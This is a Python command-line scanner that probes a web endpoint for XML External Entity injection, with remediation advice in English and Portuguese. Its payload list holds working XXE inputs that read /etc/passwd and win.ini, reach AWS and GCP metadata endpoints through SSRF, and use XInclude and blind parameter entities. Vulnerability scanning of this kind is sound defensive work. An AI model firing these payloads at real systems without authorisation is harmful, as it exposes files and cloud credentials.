#!/usr/bin/env python3
"""Probe for XML External Entity (XXE) injection vulnerabilities.

Sends crafted XML payloads to an endpoint via HTTP POST and checks
responses for evidence of file disclosure or SSRF. Tests:
  - Classic in-band entity injection (file:///etc/passwd, C:/Windows/win.ini)
  - SSRF via external entity (AWS IMDSv1, GCP metadata)
  - XInclude file read (bypasses DOCTYPE filtering on some parsers)
  - Blind SSRF via parameter entity (timing side-channel)

Exit codes:
  0  No XXE detected
  1  One or more injection points confirmed or suspected (timing)
  2  Bad URL / usage error
  3  Network / DNS / TLS error

Examples:
    tools/xxe_probe.py https://example.com/api/parse
    tools/xxe_probe.py https://example.com/api --content-type text/xml
    tools/xxe_probe.py https://example.com/upload --timeout 15 --lang pt
    tools/xxe_probe.py https://example.com/soap --proxy http://127.0.0.1:8080
    tools/xxe_probe.py https://example.com/api --json
    echo https://example.com/api | tools/xxe_probe.py -
"""

from __future__ import annotations

import argparse
import json
import re
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import asdict, dataclass
from typing import List, Optional, Tuple

from _lib import (
    build_ssl_context,
    build_opener,
    add_proxy_arg,
    make_user_agent,
    add_version_arg,
    add_user_agent_arg,
    stdin_or_arg,
)

TOOL_NAME = "xxe_probe.py"
USER_AGENT = make_user_agent(TOOL_NAME)
LANGS = ("en", "pt")

LABELS = {
    "en": {
        "target": "Target",
        "content_type": "Content-Type",
        "baseline": "baseline",
        "tests": "Tests run",
        "confirmed": "Confirmed (signature match)",
        "timing": "Possible (timing side-channel only)",
        "findings_header": "XXE injection found",
        "no_findings": "No XXE injection detected with the payloads tried.",
        "technique": "Technique",
        "evidence": "Evidence",
        "err_scheme": "error: URL must start with http:// or https://",
        "err_net": "error: could not reach",
    },
    "pt": {
        "target": "Alvo",
        "content_type": "Content-Type",
        "baseline": "baseline",
        "tests": "Testes executados",
        "confirmed": "Confirmado (correspondência de assinatura)",
        "timing": "Possível (side-channel de temporização)",
        "findings_header": "Injeção XXE encontrada",
        "no_findings": "Nenhuma injeção XXE detetada com os payloads tentados.",
        "technique": "Técnica",
        "evidence": "Evidência",
        "err_scheme": "erro: URL tem de começar por http:// ou https://",
        "err_net": "erro: não foi possível alcançar",
    },
}

ISSUE_TEXT = {
    "en": {
        "risk": (
            "XXE allows reading local files (e.g. /etc/passwd, private keys, "
            "application configs), SSRF to internal services (AWS/GCP metadata, "
            "internal APIs), and in some parsers, denial of service via recursive "
            "entity expansion (Billion Laughs attack)."
        ),
        "fix": (
            "Disable external entity processing in the XML parser. "
            "Java: XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = false. "
            "PHP: libxml_disable_entity_loader(true). "
            "Python lxml: etree.XMLParser(resolve_entities=False). "
            "If XML is not required for this endpoint, prefer JSON."
        ),
        "risk_label": "Risk:",
        "fix_label": "Fix:",
    },
    "pt": {
        "risk": (
            "XXE permite ler ficheiros locais (ex: /etc/passwd, chaves privadas, "
            "configs da aplicação), SSRF para serviços internos (metadata AWS/GCP, "
            "APIs internas), e nalguns parsers, denial of service via expansão "
            "recursiva de entidades (ataque Billion Laughs)."
        ),
        "fix": (
            "Desativa o processamento de entidades externas no parser XML. "
            "Java: XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = false. "
            "PHP: libxml_disable_entity_loader(true). "
            "Python lxml: etree.XMLParser(resolve_entities=False). "
            "Se XML não for necessário neste endpoint, prefere JSON."
        ),
        "risk_label": "Risco:",
        "fix_label": "Correção:",
    },
}

# Benign baseline payload to measure normal response time and size.
_BENIGN = '<?xml version="1.0"?><root><data>probe</data></root>'

# Payload definitions. Each entry:
#   id          — short identifier
#   desc        — human-readable description
#   xml         — the crafted XML body to POST
#   technique   — category (entity / xinclude / param_entity)
#   signatures  — list of regex patterns; any match = confirmed finding
#                 empty list = timing side-channel only
_PAYLOADS = [
    {
        "id": "file_passwd",
        "desc": "File read — file:///etc/passwd",
        "xml": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
            '<root><data>&xxe;</data></root>'
        ),
        "technique": "entity",
        "signatures": [r"root:x?:0:0:", r"\bnobody:[^:]+:\d+", r"\bdaemon:[^:]+:\d+"],
    },
    {
        "id": "file_win_ini",
        "desc": "File read — file:///C:/Windows/win.ini",
        "xml": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>\n'
            '<root><data>&xxe;</data></root>'
        ),
        "technique": "entity",
        "signatures": [r"\[fonts\]", r"\[extensions\]", r"\[mci extensions\]"],
    },
    {
        "id": "ssrf_aws",
        "desc": "SSRF via entity — AWS IMDSv1 (169.254.169.254)",
        "xml": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"http://169.254.169.254/latest/meta-data/">]>\n'
            '<root><data>&xxe;</data></root>'
        ),
        "technique": "entity",
        "signatures": [r"\bami-id\b", r"\binstance-id\b", r"\blocal-ipv4\b"],
    },
    {
        "id": "ssrf_gcp",
        "desc": "SSRF via entity — GCP metadata (metadata.google.internal)",
        "xml": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"http://metadata.google.internal/computeMetadata/v1/">]>\n'
            '<root><data>&xxe;</data></root>'
        ),
        "technique": "entity",
        "signatures": [r"\bproject-id\b", r"\bservice-accounts/\b", r"\binstance/\b"],
    },
    {
        "id": "xinclude_passwd",
        "desc": "XInclude file read — file:///etc/passwd (bypasses DOCTYPE filter)",
        "xml": (
            '<root xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include parse="text" href="file:///etc/passwd"/>'
            "</root>"
        ),
        "technique": "xinclude",
        "signatures": [r"root:x?:0:0:", r"\bnobody:[^:]+:\d+", r"\bdaemon:[^:]+:\d+"],
    },
    {
        "id": "param_entity_ssrf",
        "desc": "Blind SSRF via parameter entity — AWS IMDSv1 (timing side-channel)",
        "xml": (
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
            '"http://169.254.169.254/latest/meta-data/"> %xxe;]>\n'
            "<root/>"
        ),
        "technique": "param_entity",
        "signatures": [],  # no in-band output; detected via timing only
    },
]

# Response time > baseline × TIMING_MUL AND > baseline + TIMING_MIN → timing flag.
_TIMING_MUL = 2.5
_TIMING_MIN_DELTA = 2.0


@dataclass
class Finding:
    payload_id: str
    technique: str
    description: str
    evidence: str
    content_type: str
    confirmed: bool   # True = signature matched; False = timing suspicion only


def _post(
    url: str,
    body: str,
    content_type: str,
    timeout: float,
    user_agent: str,
    opener: urllib.request.OpenerDirector,
) -> Tuple[int, str, float]:
    """POST body to url. Returns (status_code, response_text, elapsed_seconds)."""
    data = body.encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "User-Agent": user_agent,
            "Content-Type": f"{content_type}; charset=utf-8",
        },
        method="POST",
    )
    t0 = time.monotonic()
    try:
        with opener.open(req, timeout=timeout) as resp:
            body_bytes = resp.read(65536)
            elapsed = time.monotonic() - t0
            return resp.status, body_bytes.decode("utf-8", errors="replace"), elapsed
    except urllib.error.HTTPError as e:
        elapsed = time.monotonic() - t0
        try:
            body_bytes = e.read(65536)
        except Exception:
            body_bytes = b""
        return e.code, body_bytes.decode("utf-8", errors="replace"), elapsed


def run(
    url: str,
    content_type: str,
    timeout: float,
    user_agent: str,
    opener: urllib.request.OpenerDirector,
) -> Tuple[List[Finding], int, float]:
    """Run all probes against url. Returns (findings, tests_run, baseline_time)."""
    findings: List[Finding] = []
    tests_run = 0

    # Establish baseline: measure response time for benign XML.
    try:
        _, _, baseline = _post(url, _BENIGN, content_type, timeout, user_agent, opener)
    except (urllib.error.URLError, socket.timeout, OSError):
        baseline = 0.5

    timing_threshold = max(baseline * _TIMING_MUL, baseline + _TIMING_MIN_DELTA)

    seen_confirmed: set = set()

    for pdef in _PAYLOADS:
        tests_run += 1
        try:
            _status, body, elapsed = _post(
                url, pdef["xml"], content_type, timeout, user_agent, opener
            )
        except (urllib.error.URLError, socket.timeout, OSError):
            continue

        # In-band signature detection
        matched = None
        for sig in pdef["signatures"]:
            m = re.search(sig, body)
            if m:
                matched = m.group(0)[:80]
                break

        if matched and pdef["id"] not in seen_confirmed:
            findings.append(Finding(
                payload_id=pdef["id"],
                technique=pdef["technique"],
                description=pdef["desc"],
                evidence=f"Response contained: {matched!r}",
                content_type=content_type,
                confirmed=True,
            ))
            seen_confirmed.add(pdef["id"])

        elif not matched and not pdef["signatures"] and elapsed >= timing_threshold:
            # Timing-only signal for blind SSRF payloads
            findings.append(Finding(
                payload_id=pdef["id"],
                technique=pdef["technique"],
                description=pdef["desc"],
                evidence=(
                    f"Response took {elapsed:.1f}s vs baseline {baseline:.1f}s "
                    f"(threshold {timing_threshold:.1f}s)"
                ),
                content_type=content_type,
                confirmed=False,
            ))

    return findings, tests_run, baseline


def print_human(
    url: str,
    findings: List[Finding],
    tests_run: int,
    baseline: float,
    content_type: str,
    lang: str,
) -> None:
    L = LABELS[lang]
    IT = ISSUE_TEXT[lang]

    print(f"\n{L['target']}: {url}")
    print(
        f"{L['content_type']}: {content_type}  |  "
        f"{L['baseline']}: {baseline:.2f}s  |  "
        f"{L['tests']}: {tests_run}"
    )
    print()

    if not findings:
        print(L["no_findings"])
        print()
        return

    print(f"{L['findings_header']} ({len(findings)}):\n")
    for f in findings:
        status_str = L["confirmed"] if f.confirmed else L["timing"]
        print(f"  {'✗' if f.confirmed else '?'} {f.description}")
        print(f"     {L['technique']}: {f.technique}")
        print(f"     {L['evidence']}: {f.evidence}")
        print(f"     Status: {status_str}")
        if f.confirmed:
            print(f"     {IT['risk_label']} {IT['risk']}")
            print(f"     {IT['fix_label']} {IT['fix']}")
        print()


def main() -> int:
    global USER_AGENT
    parser = argparse.ArgumentParser(
        prog=TOOL_NAME,
        description="Probe for XML External Entity (XXE) injection vulnerabilities.",
    )
    add_version_arg(parser, TOOL_NAME)
    add_user_agent_arg(parser, USER_AGENT)
    add_proxy_arg(parser)
    parser.add_argument(
        "url",
        help="Target URL (must accept POST with XML body). Use '-' to read from stdin.",
    )
    parser.add_argument("--lang", choices=LANGS, default="en")
    parser.add_argument("--json", action="store_true", dest="as_json")
    parser.add_argument(
        "--content-type",
        default="application/xml",
        metavar="CT",
        help="Content-Type header to use when posting XML. Default: application/xml.",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        metavar="SECS",
        help="Per-request timeout in seconds. Default: 10. "
             "Increase for timing side-channel accuracy.",
    )
    args = parser.parse_args()

    L = LABELS[args.lang]
    USER_AGENT = args.user_agent
    url = stdin_or_arg(args.url)

    if not re.match(r"^https?://", url):
        print(f"{L['err_scheme']} ({url!r})", file=sys.stderr)
        return 2

    ssl_ctx = build_ssl_context()
    opener = build_opener(ssl_ctx, proxy_url=args.proxy)

    try:
        findings, tests_run, baseline = run(
            url, args.content_type, args.timeout, USER_AGENT, opener
        )
    except (urllib.error.URLError, socket.timeout, OSError) as e:
        print(f"{L['err_net']} {url}: {e}", file=sys.stderr)
        return 3

    if args.as_json:
        print(json.dumps(
            {
                "url": url,
                "lang": args.lang,
                "content_type": args.content_type,
                "baseline_time": round(baseline, 3),
                "tests_run": tests_run,
                "findings": [asdict(f) for f in findings],
            },
            indent=2,
            ensure_ascii=False,
        ))
    else:
        print_human(url, findings, tests_run, baseline, args.content_type, args.lang)

    return 1 if findings else 0


if __name__ == "__main__":
    sys.exit(main())
